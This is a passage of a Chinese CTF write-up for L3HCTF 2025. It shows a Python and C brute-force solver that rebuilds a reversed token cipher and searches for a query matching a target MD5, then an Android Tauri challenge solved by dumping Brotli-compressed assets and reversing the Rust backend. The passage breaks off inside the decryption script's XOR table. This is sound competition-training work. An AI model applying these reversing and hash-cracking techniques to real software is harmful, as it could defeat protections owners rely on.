P_BOX_TABLE_7FF65E2BC0A0 数组为空，请填写数据。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s = to_u32(state)</span><br><span class="line">    new_state = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 获取源比特的位置 (C数组是1-based, Python是0-based)</span></span><br><span class="line">        source_bit_pos = p_box_table[i] - <span class="number">1</span></span><br><span class="line">        <span class="comment"># 检查源比特是否为1</span></span><br><span class="line">        <span class="keyword">if</span> (s &gt;&gt; source_bit_pos) &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 如果是1，则在目标位置i设置比特</span></span><br><span class="line">            new_state |= (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="keyword">return</span> new_state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_function</span>(<span class="params">state, s_box_table, p_box_table</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B17F7 (轮函数)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    state = s_box_transform(state, s_box_table)</span><br><span class="line">    state = p_box_transform(state, p_box_table)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_round_key</span>(<span class="params">key, round_num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B16A0 (轮密钥生成)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key_u32 = to_u32(key)</span><br><span class="line">    shift_amount = <span class="number">4</span> * (round_num - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># C++ 代码中 (unsigned int) &gt;&gt; 是逻辑右移</span></span><br><span class="line">    shifted_key = key_u32 &lt;&lt; shift_amount</span><br><span class="line">    <span class="keyword">return</span> to_u32(shifted_key) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_token</span>(<span class="params">timestamp, r_key, s_box_table, p_box_table</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B184D (加密主函数)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    state = to_u32(timestamp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环 3 轮</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        round_key = generate_round_key(r_key, i)</span><br><span class="line">        state ^= round_key</span><br><span class="line">        state = round_function(state, s_box_table, p_box_table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环后的第4步</span></span><br><span class="line">    round_key_4 = generate_round_key(r_key, <span class="number">4</span>)</span><br><span class="line">    state ^= round_key_4</span><br><span class="line">    state = s_box_transform(state, s_box_table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最终返回前的第5步</span></span><br><span class="line">    round_key_5 = generate_round_key(r_key, <span class="number">5</span>)</span><br><span class="line">    final_state = state ^ round_key_5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> to_u32(final_state)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1751990400</span>, <span class="number">1752052052</span>):</span><br><span class="line">    dword = t</span><br><span class="line">    dword, ret = gen(dword)</span><br><span class="line">    cnt = ret</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; cnt:</span><br><span class="line">        dword, ret = gen(dword)</span><br><span class="line">        a = ret</span><br><span class="line">        dword, ret = gen(dword)</span><br><span class="line">        b = ret</span><br><span class="line">        dword, ret = gen(dword)</span><br><span class="line">        x = ret</span><br><span class="line">        dword, ret = gen(dword)</span><br><span class="line">        y = ret</span><br><span class="line">        dword, ret = gen(dword)</span><br><span class="line">        cnt = ret</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    dword, ret = gen(dword)</span><br><span class="line">    r = ret</span><br><span class="line">    <span class="comment"># pow(a | x, 2)</span></span><br><span class="line">    val1 = math.<span class="built_in">pow</span>(<span class="built_in">float</span>(to_s32(a) | to_s32(x)), <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment"># pow(b | y, 2)</span></span><br><span class="line">    val2 = math.<span class="built_in">pow</span>(<span class="built_in">float</span>(to_s32(b) | to_s32(y)), <span class="number">2.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> math.isclose(<span class="number">0x61</span> * val1, <span class="number">0xb</span> * val2):</span><br><span class="line">        cipher = encrypt_token(</span><br><span class="line">            t, r,</span><br><span class="line">            S_BOX_TABLE_7FF65E2BC020,</span><br><span class="line">            P_BOX_TABLE_7FF65E2BC0A0</span><br><span class="line">        )</span><br><span class="line">        query = <span class="string">f&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=<span class="subst">&#123;t&#125;</span>&amp;r=<span class="subst">&#123;r&#125;</span>&amp;cipher=<span class="subst">&#123;cipher&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        query = <span class="string">f&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=<span class="subst">&#123;t&#125;</span>&amp;r=<span class="subst">&#123;r&#125;</span>&amp;a=<span class="subst">&#123;a&#125;</span>&amp;b=<span class="subst">&#123;b&#125;</span>&amp;x=<span class="subst">&#123;x&#125;</span>&amp;y=<span class="subst">&#123;y&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(t, query)</span><br><span class="line">    <span class="keyword">if</span> md5(query.encode()).hexdigest() == <span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(sha1(query.encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>但python爆破速度非常慢，直接让gemini转为c语言脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">// 引入 OpenSSL 库头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪随机数生成器，对应 python 的 gen 函数</span></span><br><span class="line"><span class="comment">// 使用指针来返回两个值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gen</span><span class="params">(<span class="type">uint32_t</span>* dword, <span class="type">uint32_t</span>* ret)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v1 = ((((*dword &lt;&lt; <span class="number">13</span>) ^ *dword) &gt;&gt; <span class="number">17</span>) ^ ((*dword &lt;&lt; <span class="number">13</span>) ^ *dword));</span><br><span class="line">    *dword = (<span class="number">32</span> * v1) ^ v1;</span><br><span class="line">    *ret = *dword &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：将二进制哈希值转换为十六进制字符串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bytes_to_hex</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* bytes, <span class="type">char</span>* hex_string, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(hex_string + (i * <span class="number">2</span>), <span class="string">&quot;%02x&quot;</span>, bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    hex_string[len * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* target_md5 = <span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> t = <span class="number">1751990400</span>; t &lt; <span class="number">1752052052</span>; ++t) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> dword = t;</span><br><span class="line">        <span class="type">uint32_t</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始 gen 调用</span></span><br><span class="line">        <span class="built_in">gen</span>(&amp;dword, &amp;ret);</span><br><span class="line">        <span class="type">uint32_t</span> cnt = ret;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> a = <span class="number">0</span>, b = <span class="number">0</span>, x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; cnt) &#123;</span><br><span class="line">            <span class="built_in">gen</span>(&amp;dword, &amp;a);</span><br><span class="line">            <span class="built_in">gen</span>(&amp;dword, &amp;b);</span><br><span class="line">            <span class="built_in">gen</span>(&amp;dword, &amp;x);</span><br><span class="line">            <span class="built_in">gen</span>(&amp;dword, &amp;y);</span><br><span class="line">            <span class="built_in">gen</span>(&amp;dword, &amp;cnt);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> r;</span><br><span class="line">        <span class="built_in">gen</span>(&amp;dword, &amp;r);</span><br><span class="line">        <span class="comment">// C中需要更大的缓冲区来格式化字符串</span></span><br><span class="line">        <span class="type">char</span> query[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">snprintf</span>(query, <span class="built_in">sizeof</span>(query), <span class="string">&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%u&amp;r=%u&amp;a=%u&amp;b=%u&amp;x=%u&amp;y=%u&quot;</span>, t, r, a, b, x, y);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u %s\n&quot;</span>, t, query);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout); <span class="comment">// 强制刷新输出缓冲区，确保立即看到打印</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算 MD5</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> md5_result[MD5_DIGEST_LENGTH];</span><br><span class="line">        <span class="built_in">MD5</span>((<span class="type">unsigned</span> <span class="type">char</span>*)query, <span class="built_in">strlen</span>(query), md5_result);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> md5_hex[MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">bytes_to_hex</span>(md5_result, md5_hex, MD5_DIGEST_LENGTH);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 比较 MD5</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(md5_hex, target_md5) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Found MD5 match!\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 计算并打印 SHA1</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> sha1_result[SHA_DIGEST_LENGTH];</span><br><span class="line">            <span class="built_in">SHA1</span>((<span class="type">unsigned</span> <span class="type">char</span>*)query, <span class="built_in">strlen</span>(query), sha1_result);</span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> sha1_hex[SHA_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">            <span class="built_in">bytes_to_hex</span>(sha1_result, sha1_hex, SHA_DIGEST_LENGTH);</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SHA1: %s\n&quot;</span>, sha1_hex);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 找到结果，退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>gcc ./paradox_solve.c -o solve -lssl -lcrypto -lm</code></p>
<p><img src="../images/2025-L3HCTF/120aaaf1-4c0c-4433-b770-fbd9cab49792.png" alt="img"></p>
<p>得到正确query的sha1结果</p>
<h2><span id="ez-android">ez_android</span><a href="#ez-android" class="header-anchor"></a></h2><p><img src="../images/2025-L3HCTF/b498a370-9988-401a-af1e-bb924e26edaf.png" alt="img"></p>
<p>TauriActivity特征，需要去解包静态资源，本来想着直接Hook Webview直接调试的，结果不知道为啥一hook就进不去程序，无奈只能老老实实解包看看咋个事情</p>
<p><img src="../images/2025-L3HCTF/f4783aca-b0da-44ae-bf1d-03e9a30c2376.png" alt="img"></p>
<p>首先看静态资源表，这里分别是name nameLen contentPtr contentSize，那么就解压size就行</p>
<p>翻了一下去年L3H的脚本居然还能用</p>
<p>解包都是这个脚本，地址的话就是压缩内容的范围</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x140371D3A</span> <span class="comment"># 这里的地址是压缩内容的地址</span></span><br><span class="line">endadd = <span class="number">0x1403772A8</span>-<span class="number">1</span></span><br><span class="line">dump = [<span class="number">0</span>] * (endadd - addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(addr, endadd):</span><br><span class="line">    dump[i - addr] = get_wide_byte(i)</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">r&#x27;D:\算法训练\一堆比赛\L3H\dump.br&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">bytes</span>(dump))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Dump written to <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"></span><br><span class="line">compressed_file_path = <span class="string">&quot;dump.br&quot;</span></span><br><span class="line">output_file_path = <span class="string">&quot;dumpp&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = <span class="built_in">open</span>(compressed_file_path, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Compressed file size: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_decompress</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> brotli.decompress(data)</span><br><span class="line">    <span class="keyword">except</span> brotli.error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content), <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    decompressed = try_decompress(content[:i])</span><br><span class="line">    <span class="keyword">if</span> decompressed:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> decompressed:</span><br><span class="line">    <span class="built_in">open</span>(output_file_path, <span class="string">&quot;wb&quot;</span>).write(decompressed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decompressed content written to <span class="subst">&#123;output_file_path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to decompress the content.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>解压缩后看index</p>
<p><img src="../images/2025-L3HCTF/cf40c0f2-9dc4-4485-8502-4a4f93873567.png" alt="img"></p>
<p>没啥东西，单纯就一加载js</p>
<p><img src="../images/2025-L3HCTF/721c13ef-3482-4f76-8952-e88da3af6942.png" alt="img"></p>
<p>js和这个rust后端交互，后端的接口是greet，并且前端未作加密，我们可以直接逆后端。</p>
<p>那既然知道了greet就直接搜索greet就可</p>
<p><img src="../images/2025-L3HCTF/f8b016e5-af45-4709-afb9-0e7f58f07253.png" alt="img"></p>
<p><img src="../images/2025-L3HCTF/d02f74b8-7ad3-4ee5-9c32-6eda99684bb9.png" alt="img"></p>
<p>逻辑清晰明了</p>
<p>解密代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">xor = [<span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x63</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x49</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x52</span>, <span class="number">0x65</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x43</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x44</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x65</span>, <span class="number">0x52</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x43</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x53</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x65</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x27</span>, <span class="number">0x70</span>, <span class="number">0x6C</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x3A</span>, <span class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x62</span>, <span class="number">0x2E</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x47</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0x63</span>, <span class="number">0x32</span>, <span class="number">0x6C</span>, <span class="number">0x7A</span>, <span class="number">0x59</span>, <span class="number">0x57</span>, <span class="number">0x74</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x51</span>, <span class="number">0x57</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x20</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x20</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x3A</span>, <span class="number">0x20</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x20</span>, <span class="number">0x38</span>, <span class="number">0x4D</span>, <span class="number">0x69</span>, <span class="number">0x42</span>, <span 